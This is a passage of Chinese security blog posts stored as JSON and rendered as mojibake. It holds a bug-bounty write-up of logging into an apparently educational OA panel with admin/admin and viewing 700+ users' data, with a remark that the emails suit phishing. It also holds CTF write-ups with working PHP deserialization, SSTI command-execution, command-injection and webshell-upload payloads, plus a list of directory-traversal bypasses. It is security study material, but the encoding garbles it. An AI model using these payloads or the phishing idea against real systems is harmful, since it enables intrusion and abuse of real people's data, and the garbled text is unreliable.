æ€»ç»“ä¸€å¥è¯ï¼šæŒ–æ¼æ´ä¸€å®šæ³¨é‡å‰æœŸçš„ä¿¡æ¯æœé›†ï¼ˆè™½ç„¶æˆ‘æŒ–å‡ºæ¥äº†ï¼Œä½†æˆ‘ä»ç„¶çŸ¥é“æˆ‘ä¿¡æ¯æœé›†åšçš„æœ‰ç‚¹çƒ‚ï¼Œè¿™æ¬¡ä¹‹åä¸€å®šæ³¨é‡ç»†èŠ‚äº†ï¼‰ï¼Œå¦å¤–å°±æ˜¯ä¸€å®šè¦åšæŒï¼Œä¸€æ—¶åŠä¼šå„¿æŒ–ä¸å‡ºæ¥å¾ˆæ­£å¸¸ï¼Œä½†ä¸€å®šè¦åšæŒï¼Œæƒ³æƒ³è‡ªå·±çš„æµç¨‹è¿˜æœ‰ä»€ä¹ˆé—æ¼ä»¥åŠå¯ä»¥æ”¹è¿›çš„åœ°æ–¹ã€‚æŒ–æ¼æ´ä¸€å®šè¦è€å¿ƒï¼Œä¸å¯è’å™ªã€‚ æ¼æ´æŒ–æ˜ è¿™é‡Œé¦–å…ˆéšæœºæŒ‘é€‰ä¸€åå¹¸è¿å„¿ï¼Œæˆ‘è¿™é‡Œæ˜¯éšåè¿›ä»–å®˜ç½‘ï¼Œç¡®å®šä¸»åŸŸåï¼Œéšæœºç”¨å­åŸŸåæŒ–æ˜æœºï¼Œçˆ†ç ´å­åŸŸååŠip éšååœ¨ç”¨fofa_vieweræ‰«æå­åŸŸåï¼Œè¿™æ ·å¤§æ¦‚å°±æ¯”è¾ƒå‡†ç¡®äº†ï¼Œä¸è¿‡è¿™é‡Œä¹Ÿæ˜¯æ„Ÿè§‰layeræœ‰ç‚¹é¸¡è‚‹ï¼Œè™½ç„¶å­—å…¸å¼ºå¤§ï¼Œä½†æ„Ÿè§‰ä¸æ€ä¹ˆé«˜æ•ˆï¼Œçœ‹æ—¥åçš„ä½œç”¨å§ã€‚ã€‚ã€‚ æµ‹è¯•ä¸€ç•ªå‘ç°å¯ç–‘ç‚¹ï¼Œè®¿é—®9090ç«¯å£å‘ç°è¿›å…¥ä¸€ä¸ªåå°ç™»å½•é¡µé¢ï¼Œè¿™é‡Œä¹Ÿæ˜¯æŸå¾®OAæ¼æ´ï¼Œè™½ç„¶æˆ‘è¿™é‡Œåªæ˜¯ä¸€ä¸ªå¼±å£ä»¤ï¼Œä½†æˆ‘ç›¸ä¿¡è‚¯å®šè¿˜æœ‰å…¶ä»–çš„æ¼æ´ï¼Œè¿™æ¬¡ä¹‹ååœ¨è¿›è¡Œå°è¯•ã€‚ è¿™é‡ŒæˆåŠŸå¼±å£ä»¤ç™»å½•ï¼Œç”¨æˆ·åå’Œå¯†ç éƒ½æ˜¯adminï¼ŒæˆåŠŸè¿›å…¥ è¿™é‡Œä¹Ÿæ˜¯å‘ç°ä¸ƒç™¾å¤šä¸ªç”¨æˆ·çš„ä¿¡æ¯ å…¶ä¸­æœ‰ç”µå­é‚®ç®±å¯èƒ½é€‚åˆé’“é±¼ã€‚ã€‚ã€‚ æ€»ç»“ æ„Ÿè§‰æ²¡å’‹ç”¨åŠ›ï¼Œè¿™ä¸ªç³»ç»ŸåŠŸèƒ½ç‚¹ä¹Ÿå¾ˆå•ä¸€ï¼Œå¯¹æˆ‘ä¸ªäººæ¥è¯´æ²¡æœ‰å†èƒ½è¿›ä¸€æ­¥åˆ©ç”¨çš„ç‚¹äº†ï¼Œä½†æˆ‘è§‰å¾—è¿™ç§ç±»ä¼¼çš„ç³»ç»Ÿåº”è¯¥å¯ä»¥é€šæ€ï¼Œè¿™å°±ç•™ç»™æ—¥åçš„æµ‹è¯•å§ã€‚è¿™é‡Œä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡æŒ–ï¼Œæäº¤ä¹‹åæˆåŠŸå¾—åˆ°eduè´¦å·ï¼Œæ²¡æƒ³åˆ°è¿™è¿˜èƒ½è¯„ä¸Šä¸­å±ã€‚ã€‚ã€‚ã€‚ ç»§ç»­åšæŒï¼ï¼ï¼","categories":["srcæ¼æ´æŒ–æ˜"]},{"title":"æ”»é˜²ä¸–ç•Œ-Web_php_unserialize","path":"/2023/08/08/web-php-unserialize/","content":"é¢˜ç›®æè¿°ï¼š æ—  é¢˜ç›®è§£é¢˜ï¼š &lt;?php class Demo { private $file = 'index.php'; public function __construct($file) { $this-&gt;file = $file; } function __destruct() { echo @highlight_file($this-&gt;file, true); } function __wakeup() { if ($this-&gt;file != 'index.php') { //the secret is in the fl4g.php $this-&gt;file = 'index.php'; } } } if (isset($_GET['var'])) { $var = base64_decode($_GET['var']); if (preg_match('/[oc]:\\d+:/i', $var)) { die('stop hacking!'); } else { @unserialize($var); } } else { highlight_file(\"index.php\"); } ?&gt; å¾ˆå°´å°¬ï¼Œè¿™é¢˜å·²ç»åšè¿‡äº†ï¼Œæ„Ÿå…´è¶£å¯ä»¥ç¿»ç¿»æˆ‘ä»¥å‰çš„æ–‡ç« ï¼Œè¿™é‡Œå°±ç›´æ¥ä¸Špopäº†ï¼Œä¹Ÿå¾ˆç®€å• &lt;?php class Demo { private $file = 'index.php'; public function __construct($file) { $this-&gt;file = $file; } function __destruct() { echo @highlight_file($this-&gt;file, true); } function __wakeup() { if ($this-&gt;file != 'index.php') { //the secret is in the fl4g.php $this-&gt;file = 'index.php'; } } } $a= new Demo('fl4g.php'); $poc=serialize($a); $poc=str_replace('O:4', 'O:+4',$poc); $poc=str_replace(':1:', ':2:',$poc); echo $poc; $poc = (base64_encode($poc)); echo $poc; ?&gt; è¾“å‡ºå¦‚ä¸‹ï¼š O:+4:\"Demo\":2:{s:10:\"Demofile\";s:8:\"fl4g.php\";} TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ== æ‹¿åˆ°flag","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-Web_python_template_injection","path":"/2023/08/08/web-python-template-injection/","content":"é¢˜ç›®æè¿°ï¼š æ—  é¢˜ç›®è§£é¢˜ï¼š çœ‹åˆ°è¯¥é¡µé¢ï¼Œæ¯«æ— ç–‘é—®å°±æ˜¯pythonçš„sstiæ³¨å…¥äº†ï¼Œé‚£æˆ‘ä»¬æŠ“åŒ…çœ‹ä¸€ä¸‹ åœ¨è¿™é‡Œçœ‹åˆ°é¡µé¢ä¹Ÿæ²¡æœ‰æ³¨å…¥çš„åœ°æ–¹ï¼Œå°±æƒ³ç€ç°åœ¨urlåé¢ç›´æ¥åŠ ä¸Šæ¨¡æ¿çœ‹çœ‹ å¦‚ä¸Šå›¾ï¼ŒæˆåŠŸè¯æ˜å­˜åœ¨sstiæ¼æ´ é‚£æˆ‘ä»¬å…ˆå–objectè¿™ä¸ªç±»ï¼Œéšååœ¨åˆ—ä¸¾å‡ºå…¶æ‰€æœ‰å­ç±»ï¼ˆè¿™é‡Œæˆ‘æ˜¯å…ˆçœ‹äº†çœ‹ç¬¬400ä¸ªä»¥åçš„å…ƒç´ ï¼‰ è¿™é‡Œåˆæ‰¾åˆ°ä¸€ä¸ªpopenå‘½ä»¤å‡½æ•°ï¼Œé‚£æˆ‘ä»¬åœ¨å®šä½ä¸€ä¸‹ï¼Œè¿™é‡Œé‡‡ç”¨å¦‚ä¸‹payload {{().__class__.__bases__[0].__subclasses__()}} ç›´æ¥ä¸Šè„šæœ¬æ‰¾ import requests headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0' } for i in range(500): url = \"http://61.147.171.105:62011/={{().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"].__init__.__globals__}}\" res = requests.get(url=url, headers=headers) if 'popen' in res.text: print(i) æ‰¾åˆ°237ï¼Œå®šä½ä¸€ä¸‹çœ‹çœ‹ æˆåŠŸå®šä½ï¼Œé‚£ç›´æ¥ä¼ å‚æ•°lsï¼Œpayloadå¦‚ä¸‹ {{().__class__.__bases__[0].__subclasses__()[237](\"ls\",shell=True,stdout=-1).communicate()}} è¯¦ç»†ä½¿ç”¨æ–¹æ³•å¯ä»¥å‚è€ƒPythonæ‰‹å†Œï¼Œè¿™é‡Œcommunicateå‡½æ•°ä½œç”¨æ˜¯å°†å‘½ä»¤æ‰§è¡Œåçš„å†…å®¹è¾“å‡ºå‡ºæ¥ æ‰¾åˆ°flagï¼Œcatè¯»ä¸€ä¸‹çœ‹çœ‹ {{().__class__.__bases__[0].__subclasses__()[237](\"cat fl4g\",shell=True,stdout=-1).communicate()}} æˆåŠŸ","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-web2","path":"/2023/08/08/web2/","content":"é¢˜ç›®æè¿°ï¼š è§£å¯† é¢˜ç›®è§£é¢˜ï¼š æ‰“å¼€é¢˜ç›®å¼€å§‹å®¡è®¡ä»£ç  &lt;?php $miwen=\"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws\"; function encode($str){ $_o=strrev($str); // echo $_o; for($_0=0;$_0&lt;strlen($_o);$_0++){ $_c=substr($_o,$_0,1); $__=ord($_c)+1; $_c=chr($__); $_=$_.$_c; } return str_rot13(strrev(base64_encode($_))); } highlight_file(__FILE__); /* é€†å‘åŠ å¯†ç®—æ³•ï¼Œè§£å¯†$miwenå°±æ˜¯flag */ ?&gt; å…ˆè§£é‡Šä¸€ä¸‹å„ä¸ªå‡½æ•°ç”¨æ³• strrevâ€” åè½¬å­—ç¬¦ä¸² è¯´æ˜ string strrev (string $string) è¿”å› `string` åè½¬åçš„å­—ç¬¦ä¸²ã€‚ å‚æ•° string å¾…åè½¬çš„åŸå§‹å­—ç¬¦ä¸²ã€‚ è¿”å›å€¼ è¿”å›åè½¬åçš„å­—ç¬¦ä¸²ã€‚ Example #1 ä½¿ç”¨ strrev() åè½¬å­—ç¬¦ä¸² &lt;?php echo strrev(\"Hello world!\"); // è¾“å‡º \"!dlrow olleH\" ?&gt; substr â€” è¿”å›å­—ç¬¦ä¸²çš„å­ä¸² è¯´æ˜ string substr( string $string, int $start[, int $length] ) è¿”å›å­—ç¬¦ä¸² string ç”± start å’Œ length å‚æ•°æŒ‡å®šçš„å­å­—ç¬¦ä¸²ã€‚ å‚æ•° string è¾“å…¥å­—ç¬¦ä¸²ã€‚å¿…é¡»è‡³å°‘æœ‰ä¸€ä¸ªå­—ç¬¦ã€‚ start å¦‚æœ start æ˜¯éè´Ÿæ•°ï¼Œè¿”å›çš„å­—ç¬¦ä¸²å°†ä» string çš„ start ä½ç½®å¼€å§‹ï¼Œä» 0 å¼€å§‹è®¡ç®—ã€‚ä¾‹å¦‚ï¼Œåœ¨å­—ç¬¦ä¸² \"abcdef\" ä¸­ï¼Œåœ¨ä½ç½® 0 çš„å­—ç¬¦æ˜¯ \"a\"ï¼Œä½ç½® 2 çš„å­—ç¬¦ä¸²æ˜¯ \"c\" ç­‰ç­‰ã€‚ å¦‚æœ start æ˜¯è´Ÿæ•°ï¼Œè¿”å›çš„å­—ç¬¦ä¸²å°†ä» string ç»“å°¾å¤„å‘å‰æ•°ç¬¬ start ä¸ªå­—ç¬¦å¼€å§‹ã€‚ å¦‚æœ string çš„é•¿åº¦å°äº startï¼Œå°†è¿”å› FALSEã€‚ Example #1 ä½¿ç”¨è´Ÿæ•° start &lt;?php $rest = substr(\"abcdef\", -1); // è¿”å› \"f\" $rest = substr(\"abcdef\", -2); // è¿”å› \"ef\" $rest = substr(\"abcdef\", -3, 1); // è¿”å› \"d\" ?&gt; ord â€” è¿”å›æŒ‡å®šå­—ç¬¦çš„ASCIIç  chr â€” è¿”å›æŒ‡å®šçš„å­—ç¬¦ ç”±æ­¤æˆ‘ä»¬ç†ä¸€ä¸‹æ€è·¯ï¼Œè¿™é‡Œä»–çš„å‡½æ•°æ˜¯å°†ä¼ å…¥çš„å­—ç¬¦ï¼Œå…ˆè¿›è¡Œé€†è½¬ï¼Œéšåå°†æ¯ä¸ªå­—ç¬¦çš„asciiå€¼å¢äº†1ï¼Œæ¥ç€å…ˆbase64ç¼–ç ï¼Œåœ¨é€†è½¬ï¼Œåœ¨rot13åŠ å¯†ï¼Œé‚£æˆ‘ä»¬é€†ç€å°†é¢˜ç›®åšä¸€éå³å¯å¾—åˆ°flag ä¹Ÿå°±æ˜¯ï¼Œå…ˆå°†å¾…è§£å¯†çš„å¯†æ–‡rot13è§£å¯† æ¥ç€å°†å¾—åˆ°çš„å­—ç¬¦é€†è½¬ä¸€ä¸‹ï¼Œåœ¨base64è§£å¯† å¯è§flagå·²ç»åˆå…·é›å½¢ï¼Œæ¥ç€åœ¨é€†è½¬å­—ç¬¦ï¼Œç„¶åä»¤æ¯ä¸ªå­—ç¬¦çš„asciiå€¼å‡1ï¼Œè¿™é‡Œå‡1ä¸é€†è½¬çš„æ­¥éª¤å¯ä»¥ç¿»ä¸€ä¸‹ï¼Œä¸å½±å“ï¼Œæœ€ç»ˆå¾—åˆ°flag","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-command_execution","path":"/2023/08/07/command-execution/","content":"é¢˜ç›®æè¿°ï¼š å°å®å†™äº†ä¸ªpingåŠŸèƒ½,ä½†æ²¡æœ‰å†™waf,Xè€å¸ˆå‘Šè¯‰å¥¹è¿™æ˜¯éå¸¸å±é™©çš„ï¼Œä½ çŸ¥é“ä¸ºä»€ä¹ˆå—ã€‚ é¢˜ç›®è§£é¢˜ï¼š è¿›å…¥é¡µé¢å¦‚å›¾æ‰€ç¤ºï¼Œé¢˜ç›®å‘Šè¯‰æˆ‘ä»¬è¿™å…³æ²¡å†™wafï¼Œæ‰€ä»¥éšä¾¿è¾“å…¥å‘½ä»¤å³å¯è¿›è¡Œå‘½ä»¤æ‰§è¡Œ å‘½ä»¤æ‰§è¡Œæ¼æ´å³ä½¿ç”¨è€…å¯ä»¥ç›´æ¥åœ¨Webåº”ç”¨ä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä»è€Œè·å–æ•æ„Ÿä¿¡æ¯æˆ–è€…æ‹¿ä¸‹shellæƒé™ã€‚å…¶é€ æˆçš„åŸå› æ˜¯WebæœåŠ¡å™¨å¯¹ç”¨æˆ·è¾“å…¥å‘½ä»¤å®‰å…¨æ£€æµ‹ä¸è¶³ï¼ˆæ¯”å¦‚æ²¡åŠ wafï¼‰ï¼Œå¯¼è‡´æ¶æ„ä»£ç è¢«æ‰§è¡Œã€‚ pingç”¨äºç¡®å®šæœ¬åœ°ä¸»æœºæ˜¯å¦èƒ½ä¸å¦ä¸€å°ä¸»æœºæˆåŠŸäº¤æ¢(å‘é€ä¸æ¥æ”¶)æ•°æ®åŒ…ï¼Œå†æ ¹æ®è¿”å›çš„ä¿¡æ¯ï¼Œå°±å¯ä»¥æ¨æ–­TCP/IPå‚æ•°æ˜¯å¦è®¾ç½®æ­£ç¡®ï¼Œä»¥åŠè¿è¡Œæ˜¯å¦æ­£å¸¸ã€ç½‘ç»œæ˜¯å¦é€šç•…ç­‰ å…ˆç”¨æœ¬æœº127.0.0.1å»pingä¸€ä¸‹çœ‹ å‘ç°æœ‰å›æ˜¾ï¼Œè¯´æ˜pingæˆåŠŸäº†ã€‚ç„¶åæˆ‘ä»¬å¯ä»¥å°†è¾“å…¥å‚æ•°æˆªæ–­ä»è€Œè®©å…¶è¿è¡Œå±é™©çš„å‚æ•°ã€‚ å¸¸è§ç®¡é“è¿æ¥ç¬¦å¦‚ä¸‹ï¼š ; A;B å…ˆæ‰§è¡ŒAï¼Œå†æ‰§è¡ŒB &amp; A&amp;B ç®€å•æ‹¼æ¥ï¼ŒA Bä¹‹é—´æ— åˆ¶çº¦å…³ç³» | A|B æ˜¾ç¤ºBçš„æ‰§è¡Œç»“æœ &amp;&amp; A&amp;&amp;B Aæ‰§è¡ŒæˆåŠŸï¼Œç„¶åæ‰ä¼šæ‰§è¡ŒB || A||B Aæ‰§è¡Œå¤±è´¥ï¼Œç„¶åæ‰ä¼šæ‰§è¡ŒB é‚£æˆ‘ä»¬è¾“å…¥ï¼š127.0.0.1|lsçœ‹çœ‹ æˆåŠŸæ‰§è¡Œï¼Œé‚£ä¹ˆæ‰¾ä¸€ä¸‹flagï¼Œfind / name \"flag*\" æŸ¥çœ‹flag.txtå³å¯ ICMPæ˜¯Internetæ§åˆ¶æŠ¥æ–‡åè®®ã€‚å®ƒæ˜¯TCP/IPåè®®ç°‡çš„ä¸€ä¸ªå­åè®®ï¼Œç”¨äºåœ¨IPä¸»æœºã€è·¯ç”±å™¨ä¹‹é—´ä¼ é€’æ§åˆ¶æ¶ˆæ¯ã€‚æ§åˆ¶æ¶ˆæ¯æ˜¯æŒ‡ç½‘ç»œé€šä¸é€šã€ä¸»æœºæ˜¯å¦å¯è¾¾ã€è·¯ç”±æ˜¯å¦å¯ç”¨ç­‰ç½‘ç»œæœ¬èº«çš„æ¶ˆæ¯ã€‚ è€ŒICMPåè®®ä¸»è¦æ˜¯é pingå·¥å…·æ¥å®ç°çš„ã€‚ä½¿ç”¨pingäº†ä¹‹åä¼šæ”¶åˆ°æ¥è‡ªipåœ°å€ï¼ˆä¹Ÿæœ‰å¯èƒ½æ˜¯é€šè¿‡DNSæŠŠurlç»™è§£æä¸ºipåœ°å€ï¼‰çš„å›å¤ã€‚è€Œpingæœ¬åœ°çš„å›ç¯åœ°å€ï¼ˆ127.0.0.1ï¼‰çš„æ“ä½œæ˜¯æ£€æŸ¥æœ¬æœºçš„ç½‘å¡ï¼ŒTCP/IPé…ç½®æ˜¯å¦æ­£ç¡®ï¼Œä¹Ÿæ˜¯ä½¿ç”¨pingå·¥å…·çš„é¦–è¦æ­¥éª¤ã€‚ å‚è€ƒæ–‡ç« ï¼š wpå‚è€ƒ","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-xff_referer","path":"/2023/08/07/xff-referer/","content":"é¢˜ç›®æè¿°ï¼š Xè€å¸ˆå‘Šè¯‰å°å®å…¶å®xffå’Œrefereræ˜¯å¯ä»¥ä¼ªé€ çš„ã€‚ é¢˜ç›®è§£é¢˜ï¼š å¾ˆæ˜æ˜¾ï¼Œæˆ‘ä»¬ç›´æ¥bpä¿®æ”¹xffå¤´ å¦‚å›¾æ‰€ç¤ºï¼Œä¿®æ”¹åæç¤ºä¿¡æ¯å¦‚å›¾ï¼Œé‚£æˆ‘ä»¬ä¿®æ”¹refererå¤´ æˆåŠŸå¾—åˆ°flag","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-upload1","path":"/2023/08/07/upload1/","content":"é¢˜ç›®æè¿°ï¼š æ—  é¢˜ç›®è§£é¢˜ï¼š æ¥åˆ°é¡µé¢ï¼Œä»¥ä¸ºè¿™é“é¢˜å¾ˆéš¾å‘¢ï¼Œç»“æœã€‚ã€‚ã€‚ è¿™ä¸éš¾åº¦ä¹Ÿä¸åŒ¹é…å•Šï¼Œä¸è¯´äº†ï¼Œå¼€å§‹è§£é¢˜ é¦–å…ˆéšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶å¤¹è¯•è¯•æ°´ å‘ç°æˆ‘å†ä¸Šä¼ äº†ä¸€ä¸ªæ™®é€šçš„1.txtä¹‹åï¼Œå¼¹å‡ºäº†ä¸€ä¸ªéªŒè¯æ¡†ï¼Œé‚£ä¼°è®¡å°±æ˜¯å‰ç«¯éªŒè¯äº†ï¼Œè¿™é‡ŒF12ç¦ç”¨jså³å¯ï¼Œæ¥ç€æŠ“åŒ…ä¿®æ”¹è¯•è¯• ä¿®æ”¹ä¸ºphpåï¼Œå‘ç°æˆåŠŸä¸Šä¼ ã€‚ã€‚ã€‚ã€‚ã€‚ï¼Œé‚£æˆ‘ä»¬è®¿é—®ä¸€ä¸‹ å‘ç°æˆåŠŸç§é©¬ï¼Œé‚£ç›´æ¥èšå‰‘è¿æ¥ æ‰¾åˆ°flagã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æµ…æç›®å½•ç©¿è¶Š","path":"/2023/08/07/qian-xi-mu-lu-chuan-yue/","content":"0x01 ç®€ä»‹ ç›®å½•ç©¿è¶Šï¼ˆä¹Ÿè¢«ç§°ä¸ºç›®å½•éå†ï¼‰æ˜¯é€šè¿‡ä½¿ç”¨../ç­‰ç›®å½•æ§åˆ¶åºåˆ—æˆ–è€…æ–‡ä»¶çš„ç»å¯¹è·¯å¾„æ¥è®¿é—®å­˜å‚¨åœ¨æ–‡ä»¶ç³»ç»Ÿä¸Šçš„ä»»æ„æ–‡ä»¶å’Œç›®å½•ï¼Œç‰¹åˆ«æ˜¯åº”ç”¨ç¨‹åºæºä»£ç ã€é…ç½®æ–‡ä»¶ã€é‡è¦çš„ç³»ç»Ÿæ–‡ä»¶ç­‰ã€‚ è·¯å¾„ç©¿è¶Šæ˜¯ç½‘ç«™è¢«æ¶æ„äººå‘˜åˆ©ç”¨ï¼Œæ¥å¾—åˆ°å…¶æ— æƒé™è®¿é—®çš„å†…å®¹ã€‚ é€šå¸¸æ˜¯ç”±äºä»£ç æ²¡æœ‰åˆ¤æ–­æ‹¼æ¥è·¯å¾„çš„çœŸå®è·¯å¾„æ˜¯å¦åˆæ³•ï¼Œæœ€ç»ˆå¯¼è‡´æ–‡ä»¶è¯»å–ã€‚ ä¸€èˆ¬æ¥è®²ç”¨æˆ·åœ¨ç½‘ç«™è¿›è¡Œæµè§ˆï¼Œæ‰€èƒ½è§åˆ°çš„ç½‘é¡µéƒ½æ˜¯ä½äºç½‘ç«™æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œæ ¹ç›®å½•ä»¥å¤–çš„æ–‡ä»¶æ˜¯ä¸å…è®¸è¢«æœªæˆæƒè®¿é—®çš„ã€‚ä½†æ˜¯å®‰å…¨æ–¹é¢åšå¾—ä¸ä¸¥è°¨çš„webç¨‹åºå¯èƒ½ä¼šå‡ºç°ç›®å½•ç©¿è¶Šæ¼æ´ï¼Œæ¶æ„äººå‘˜å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´æ¥è¯»å–æ ¹ç›®å½•ä»¥å¤–çš„æ–‡ä»¶å¤¹ã€‚ä¸€æ—¦æˆåŠŸï¼Œæœ¬ä¸åº”è¯¥æš´éœ²çš„æ•æ„Ÿä¿¡æ¯å°±å¯èƒ½è¢«æ³„æ¼ç»™æ¶æ„äººå‘˜ã€‚ 0x02 æ”»å‡»payload 1.URLå‚æ•° Â·Â·/ ..\\ ..;/ 2.Nginx off by slash https://vuln.site.com/files../ 3. UNC Bypass https://localhost/c$/windows/win.ini 4.è¿‡æ»¤ç»•è¿‡ å•æ¬¡æ›¿æ¢ï¼Œå¦‚..// URLç¼–ç  16ä½Unicodeç¼–ç  è¶…é•¿UTF-8ç¼–ç  5.åŠ å¯†å‚æ•°ä¼ é€’çš„æ•°æ® æœ‰çš„ç½‘ç«™ç¨‹åºä¼ é€’å‚æ•°åä¼šè¿›è¡Œbase64åŠ å¯†ï¼ˆå½“ç„¶ä¹Ÿä¼šæœ‰å…¶ä»–åŠ å¯†ï¼‰ï¼Œå¯¼è‡´æˆ‘ä»¬ä¼ é€’çš„å‚æ•°æ— æ³•è§£æï¼Œæ‰€ä»¥å°±æ— æ³•åˆ©ç”¨ç›®å½•éå†ï¼Œè€Œç»•è¿‡æ–¹å¼ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯å…ˆå¯¹å‚æ•°è¿›è¡Œbase64åŠ å¯†åå†è¿›è¡Œä¼ å‚ã€‚å¦‚ï¼š ?page=bTByZS50eHQ= 6.ç›®å½•é™å®šç»•è¿‡ æœ‰äº›Webåº”ç”¨ç¨‹åºæ˜¯é€šè¿‡é™å®šç›®å½•æƒé™æ¥åˆ†ç¦»çš„ã€‚å¯ä»¥ä½¿ç”¨ä¸€äº›ç‰¹æ®Šçš„ç¬¦å·~æ¥ç»•è¿‡ã€‚æ¯”å¦‚æäº¤è¿™æ ·çš„xxx.php?page=~/../bootã€‚å°±å¯ä»¥ç›´æ¥è·³è½¬åˆ°ç¡¬ç›˜ç›®å½•ä¸‹ã€‚ 7.ç»•è¿‡æ–‡ä»¶åç¼€è¿‡æ»¤ ä¸€äº›Webåº”ç”¨ç¨‹åºåœ¨è¯»å–æ–‡ä»¶å‰ï¼Œä¼šå¯¹æäº¤çš„æ–‡ä»¶åç¼€è¿›è¡Œæ£€æµ‹ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æ–‡ä»¶ååæ”¾ä¸€ä¸ªç©ºå­—èŠ‚çš„ç¼–ç ï¼Œæ¥ç»•è¿‡è¿™æ ·çš„æ–‡ä»¶ç±»å‹çš„æ£€æŸ¥ã€‚ æ¯”å¦‚ï¼š../../../../boot.ini%00.jpgï¼ŒWebåº”ç”¨ç¨‹åºä½¿ç”¨çš„Apiä¼šå…è®¸å­—ç¬¦ä¸²ä¸­åŒ…å«ç©ºå­—ç¬¦ï¼Œå½“å®é™…è·å–æ–‡ä»¶åæ—¶ï¼Œåˆ™ç”±ç³»ç»Ÿçš„Apiä¼šç›´æ¥æˆªçŸ­ï¼Œè€Œè§£æä¸º../../../../boot.iniã€‚ åœ¨ç±»Unixçš„ç³»ç»Ÿä¸­ä¹Ÿå¯ä»¥ä½¿ç”¨Urlç¼–ç çš„æ¢è¡Œç¬¦ï¼Œä¾‹å¦‚ï¼š../../../etc/passwd%0a.jpgå¦‚æœæ–‡ä»¶ç³»ç»Ÿåœ¨è·å–å«æœ‰æ¢è¡Œç¬¦çš„æ–‡ä»¶åï¼Œä¼šæˆªçŸ­ä¸ºæ–‡ä»¶åã€‚ä¹Ÿå¯ä»¥å°è¯•%20ï¼Œä¾‹å¦‚: ../../../index.php%20 8.ç»•è¿‡æ¥è·¯éªŒè¯ Http Referer : HTTP Refereræ˜¯headerçš„ä¸€éƒ¨åˆ†ï¼Œå½“æµè§ˆå™¨å‘webæœåŠ¡å™¨å‘é€è¯·æ±‚çš„æ—¶å€™ï¼Œä¸€èˆ¬ä¼šå¸¦ä¸ŠRefererï¼Œå‘Šè¯‰æœåŠ¡å™¨æˆ‘æ˜¯ä»å“ªä¸ªé¡µé¢é“¾æ¥è¿‡æ¥çš„ åœ¨ä¸€äº›Webåº”ç”¨ç¨‹åºä¸­ï¼Œä¼šæœ‰å¯¹æäº¤å‚æ•°çš„æ¥è·¯è¿›è¡Œåˆ¤æ–­çš„æ–¹æ³•ï¼Œè€Œç»•è¿‡çš„æ–¹æ³•å¯ä»¥å°è¯•é€šè¿‡åœ¨ç½‘ç«™ç•™è¨€æˆ–è€…äº¤äº’çš„åœ°æ–¹æäº¤Urlå†ç‚¹å‡»æˆ–è€…ç›´æ¥ä¿®æ”¹Http Refererå³å¯ï¼Œè¿™ä¸»è¦æ˜¯åŸå› Http Refereræ˜¯ç”±å®¢æˆ·ç«¯æµè§ˆå™¨å‘é€çš„ï¼ŒæœåŠ¡å™¨æ˜¯æ— æ³•æ§åˆ¶çš„ï¼Œè€Œå°†æ­¤å˜é‡å½“ä½œä¸€ä¸ªå€¼å¾—ä¿¡ä»»æºæ˜¯é”™è¯¯çš„ã€‚ 0x03 é˜²å¾¡ æ–¹æ¡ˆä¸€ï¼šè¿‡æ»¤æ¶æ„å­—ç¬¦ï¼Œå¦‚..ã€./ã€.\\ç­‰ ç¼ºç‚¹ï¼šé»‘åå•è¿‡æ»¤ä¸å…¨çš„è¯ï¼Œå¾ˆå®¹æ˜“è¢«ç»•è¿‡ã€‚ æ–¹æ¡ˆäºŒï¼šé‡‡ç”¨ç™½åå•æ–¹å¼ï¼Œåªå…è®¸è¯»å–ç‰¹å®šæ–‡ä»¶ï¼Œè‹¥ä¸æ˜¯ç‰¹å®šæ–‡ä»¶ç›´æ¥æ‹¦æˆªã€‚ä¹Ÿå¯ä»¥ä»…å…è®¸çº¯å­—æ¯æˆ–æ•°å­—å­—ç¬¦ç­‰ã€‚ æ–¹æ¡ˆä¸‰ï¼šæŒ‰ç…§.åˆ†å‰²ï¼Œè¯»æ–‡ä»¶åå‚æ•°å’Œæ–‡ä»¶æ ¼å¼å‚æ•°ï¼Œå¦‚æœæ–‡ä»¶åå‚æ•°ä¸­æœ‰..ï¼Œåˆ™æ‹¦æˆª 0x04 é™„å½•ï¼šUNCè·¯å¾„ UNCï¼ˆUniversal Naming Conventionï¼‰ ä¸ºäº†è¿åˆç½‘ç»œåŒ–çš„è¶‹åŠ¿ï¼Œwindowsçš„åœ°å€é£æ ¼ï¼ˆC:\\ABC\\def\\æ–‡ä»¶ã€\\\\è®¡ç®—æœºå\\dir\\fileï¼‰å‘ç½‘ç»œåœ°å€é£æ ¼åšäº†ä¸€æ¬¡å…¼å®¹å˜æ¢ã€‚ æ•´ä½“å½¢å¼å¦‚ï¼š file://æœºå™¨çš„IPåœ°å€/ç›®å½•/æ–‡ä»¶ fileè¡¨ç¤ºåè®®ç±»å‹ :// åé¢æ˜¯æœºå™¨çš„ç½‘ç»œåœ°å€ /åé¢æ˜¯ç›®å½•å’Œæ–‡ä»¶å æˆ‘ä»¬è®¿é—®ç½‘ä¸Šé‚»å±…æ‰€é‡‡ç”¨çš„å‘½ä»¤è¡Œè®¿é—®æ³•ï¼Œå®é™…ä¸Šåº”è¯¥ç§°ä½œUNCè·¯å¾„è®¿é—®æ³•ã€‚ 0x05 æ¼æ´å®æˆ˜ CVE-2021-41773 æ¼æ´æ¦‚è¿° Apache HTTP Serverï¼ˆç®€ç§° Apacheï¼‰æ˜¯å¼€æºçš„ Web 